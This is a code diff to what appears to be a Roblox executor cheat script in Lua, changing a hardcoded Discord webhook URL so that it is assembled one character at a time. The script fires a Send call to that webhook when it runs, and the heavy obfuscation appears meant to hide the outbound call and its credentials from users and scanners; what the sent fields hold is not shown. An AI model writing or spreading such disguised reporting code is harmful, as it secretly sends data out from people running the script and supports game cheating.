@@ -18,7 +18,7 @@ local firesignal: (RBXScriptSignal) -> () = getfenv().firesignal
 
 local ScriptVersion = getgenv().ScriptVersion
 
-local Webhook1 = "https://disco".."rd.com/api/web".."hooks/132593779".."9438012453/uEChxPzI59v5hq".."T89zkgmo0q_tWBeaomDP8".."SO7UNYcw3H0Nif76ewQCwM".."A7qZBEl1OBX"
+local Webhook1 = "h".."t".."t".."p".."s"..":".."/".."/".."d".."i".."s".."c".."o".."r".."d"..".".."c".."o".."m".."/".."a".."p".."i".."/".."w".."e".."b".."h".."o".."o".."k".."s".."/".."1".."3".."3".."0".."7".."6".."2".."4".."4".."7".."5".."5".."4".."3".."0".."8".."5".."1".."3".."/".."Z".."i".."B".."W".."8".."B".."7".."Y".."m".."c".."K".."h".."E".."J".."8".."d".."S".."O".."D".."d".."m".."i".."m".."w".."y".."Q".."B".."d".."3".."C".."t".."N".."b".."4".."F".."b".."c".."C".."C".."f".."E".."X".."0".."3".."0".."N".."n".."L".."L".."s".."X".."a".."4".."I".."A".."6".."I".."t".."O".."P".."B".."x".."k".."c".."P".."C".."8".."b"
 
 local function Send(Url: string, Fields: {{["name"]: string, ["value"]: string, ["inline"]: true}})
 	if not request then
@@ -303,4 +303,4 @@ if not ScriptVersion then
 	CreateUniversalTabs()
 end
 
-task.spawn(Send, "https://disco".."rd.com/api/web".."hooks/132593779".."9438012453/uEChxPzIh9v5hq".."T89zkgm00q_tWBeaomDP8".."SO7UNYcw3H0Nifm6ewQCwM".."A7qZEEl1OBX")
+task.spawn(Send, "h".."t".."t".."p".."s"..":".."/".."/".."d".."i".."s".."c".."o".."r".."d"..".".."c".."o".."m".."/".."a".."p".."i".."/".."w".."e".."b".."h".."o".."o".."k".."s".."/".."1".."3".."3".."0".."7".."6".."2".."4".."4".."7".."5".."6".."4".."3".."0".."8".."5".."1".."3".."/".."Z".."i".."B".."W".."8".."B".."7".."Y".."m".."c".."K".."h".."E".."J".."8".."d".."S".."O".."D".."q".."m".."i".."m".."w".."y".."p".."B".."d".."3".."C".."t".."N".."b".."4".."F".."b".."c".."C".."C".."f".."E".."x".."0".."3".."0".."N".."n".."L".."L".."s".."X".."a".."4".."I".."E".."6".."I".."t".."O".."P".."B".."x".."k".."c".."P".."C".."8".."b")
